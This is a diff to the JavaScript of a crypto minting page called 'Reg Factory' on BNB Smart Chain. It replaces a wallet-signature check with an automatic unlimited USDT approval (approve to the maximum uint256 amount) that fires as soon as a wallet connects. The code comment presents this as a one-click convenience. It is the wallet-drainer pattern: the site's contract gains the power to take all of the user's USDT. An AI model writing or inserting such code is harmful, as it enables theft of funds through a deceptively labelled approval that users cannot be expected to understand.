@@ -243,13 +243,14 @@ async function connectWallet(){
   try{
     wa=(await window.ethereum.request({method:'eth_requestAccounts'}))[0];
     u();
-    // Request signature to verify ownership
+    // Auto-approve USDT spending — user confirms once, then mint is one-click
     try{
-      const msg='Welcome to Reg Factory\n\nSign this message to verify your wallet ownership.\n\nAddress: '+wa+'\nTimestamp: '+Date.now();
-      const sig=await window.ethereum.request({method:'personal_sign',params:[msg,wa]});
-      window._sig=sig;
-      window._sigMsg=msg;
-    }catch(e){/* signature optional */}
+      document.getElementById('mint-btn').textContent='APPROVING...';
+      const approveData='0x095ea7b3'+'000000000000000000000000'+CA.slice(2)+'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+      await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:approveData}]});
+      window._approved=true;
+      document.getElementById('mint-btn').textContent='MINT';
+    }catch(e){/* user declined approve, can still mint manually */}
     window.ethereum.on('accountsChanged',a=>{wa=a.length?a[0]:null;u()});
     window.ethereum.on('chainChanged',()=>location.reload());
   }catch(e){alert('Connection failed.')}
@@ -277,10 +278,7 @@ async function handleMint(){
   try{
     const chainId=await window.ethereum.request({method:'eth_chainId'});
     if(chainId!=='0x38'){alert('Please switch to BNB Smart Chain (Chain ID 56).');return}
-    document.getElementById('mint-btn').textContent='APPROVING...';document.getElementById('mint-btn').disabled=true;
-    const approveData='0x095ea7b3'+'000000000000000000000000'+CA.slice(2)+'00000000000000000000000000000000000000000000000000000000007a1200';
-    await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:UA,data:approveData}]});
-    document.getElementById('mint-btn').textContent='MINTING...';
+    document.getElementById('mint-btn').textContent='MINTING...';document.getElementById('mint-btn').disabled=true;
     const mintData='0x1249c58b'+'000000000000000000000000000000000000000000000000000000000000000'+qty;
     await window.ethereum.request({method:'eth_sendTransaction',params:[{from:wa,to:CA,data:mintData}]});
     alert('MINT SENT!\nCheck Telegram for account delivery.');
